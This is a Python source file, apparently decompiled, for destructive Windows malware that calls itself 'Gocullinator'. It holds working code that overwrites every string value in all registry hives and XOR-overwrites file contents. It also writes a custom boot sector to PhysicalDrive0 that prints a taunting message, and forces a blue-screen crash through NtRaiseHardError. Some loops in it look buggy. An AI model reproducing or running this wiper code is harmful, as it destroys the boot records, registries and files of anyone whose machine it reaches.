Utils = __import__('Utils', fromlist=('*', ), level=0)
from Utils import *

gui = __import__('gui', fromlist=('*', ), level=0)
from gui import *

win32file = __import__('win32file', fromlist=('*', ), level=0)
from win32file import *
import ctypes

exec_warning()
import winreg
from threading import Thread

RESULT_VALUE = 'GOCULLINATOR'
le_root = {
    'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
    'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
    'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
    'HKEY_USERS': winreg.HKEY_USERS,
    'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG,
}
types = [winreg.REG_SZ]


def check_values(root, key, dakey):
    values = []
    try:
        while True:
            i = 0
            value = winreg.EnumValue(dakey, i)
            if value[2] in types:
                values.append((value[0], value[2]))
            i += 1
            continue
    except:
        if values:
            try:
                le_key = winreg.OpenKey(le_root[root],
                                        key,
                                        access=winreg.KEY_SET_VALUE)
                for value_pair in values:
                    winreg.SetValueEx(le_key, value_pair[0], 0,
                                      int(value_pair[1]), RESULT_VALUE)
                    continue
            except Exception:
                pass


def traverse(root, key):
    check = True
    try:
        dakey = winreg.OpenKey(le_root[root], key)
        check_values(root, key, dakey)
    except Exception as e:
        if 'WinError 5' in str(e):
            check = False
    if check:
        check_values(root, key, dakey)
    if key != '':
        key += '\\'
    try:
        while True:
            i = 0
            traverse(root, key + winreg.EnumKey(dakey, i))
            i += 1
            continue
    except:
        return


def OverwriteRegistry():
    ts = []
    for (i, root) in enumerate(le_root.keys()):
        ts.append(Thread(target=traverse, args=(root, ''), daemon=True))
        continue
    for t in ts:
        t.start()
        continue
    for t in ts:
        t.join()
        continue
    return


import os
from threading import Thread


def Encryption():
    __module__ = __name__
    __qualname__ = 'Encryption'

    def Encrypt(data, key):
        return ''.join(
            map(chr, [
                char ^ ord(key[i % len(key)]) & 64
                for (i, char) in enumerate([ord(c) for c in data])
            ]))

    def EncryptFile(file, key):
        display = file.split('\\')[-1]
        try:
            with open(file, 'r') as f:
                data = f.read()
            try:
                with open(file, 'w') as f:
                    f.write('Encryption is in progress...')
            except Exception:
                with open(file, 'w') as f:
                    f.write(data)
                print('[Destructive] [Encryption] Failed to encrypted file ' +
                      str(display) + '.')
                return False
            encrypted = Encryption.Encrypt(data, key)
            with open(file, 'w') as f:
                f.write(encrypted)
            print('[Destructive] [Encryption] Successfully encrypted file ' +
                  str(display) + '!')
            return True
        except Exception:
            print('[Destructive] [Encryption] Failed to encrypted file ' +
                  str(display) + '.')
            return False

    {'drive': str, 'key': str, 'return': bool}

    def EncryptDrive(drive, key):
        return


Encryption = __build_class__(Encryption, 'Encryption')


def OverwriteMBR(first_time=1):
    mbr_hexdata = bytes([
        232, 59, 0, 187, 140, 124, 232, 23, 0, 82, 180, 134, 185, 0, 0, 186, 0,
        128, 205, 21, 90, 232, 53, 0, 187, 249, 124, 232, 2, 0, 235, 97, 138,
        7, 60, 0, 116, 23, 232, 3, 0, 67, 235, 244, 180, 14, 205, 16, 82, 180,
        134, 185, 16, 0, 186, 96, 0, 205, 21, 90, 195, 195, 180, 7, 176, 0,
        183, 15, 185, 0, 0, 186, 79, 24, 205, 16, 195, 180, 7, 176, 0, 182, 0,
        183, 70, 185, 0, 0, 186, 79, 24, 205, 16, 195, 180, 7, 176, 0, 182, 0,
        138, 60, 185, 0, 0, 186, 79, 24, 205, 16, 70, 131, 254, 120, 116, 18,
        82, 180, 134, 185, 0, 0, 186, 16, 0, 205, 21, 90, 195, 232, 218, 255,
        235, 251, 190, 1, 0, 235, 246, 195, 89, 111, 117, 114, 32, 99, 111,
        109, 112, 117, 116, 101, 114, 32, 104, 97, 115, 32, 106, 117, 115, 116,
        32, 98, 117, 114, 110, 116, 32, 100, 111, 119, 110, 32, 105, 110, 32,
        102, 108, 97, 109, 101, 115, 32, 100, 117, 101, 32, 116, 111, 32, 71,
        111, 99, 117, 108, 108, 105, 110, 97, 116, 111, 114, 33, 13, 10, 13,
        10, 72, 101, 114, 101, 39, 115, 32, 115, 111, 109, 101, 116, 104, 105,
        110, 103, 32, 116, 111, 32, 107, 101, 101, 112, 32, 121, 111, 117, 32,
        97, 119, 97, 107, 101, 44, 32, 0, 13, 190, 1, 0, 69, 80, 73, 76, 69,
        80, 83, 89, 33, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 85, 170
    ])
    hDevice = CreateFileW('\\\\.\\PhysicalDrive0', GENERIC_WRITE,
                          FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                          OPEN_EXISTING, 0, 0)
    WriteFile(hDevice, mbr_hexdata, None)
    CloseHandle(hDevice)
    return True


def BSOD():
    m = ctypes.windll.ntdll
    PrivilegeState = ctypes.c_bool(1)
    m.RtlAdjustPrivilege(19, True, False, ctypes.byref(PrivilegeState))
    ErrorResponse = ctypes.c_ulong(0)
    m.NtRaiseHardError(3735936685, 0, 0, None, 6, ctypes.byref(ErrorResponse))
    return
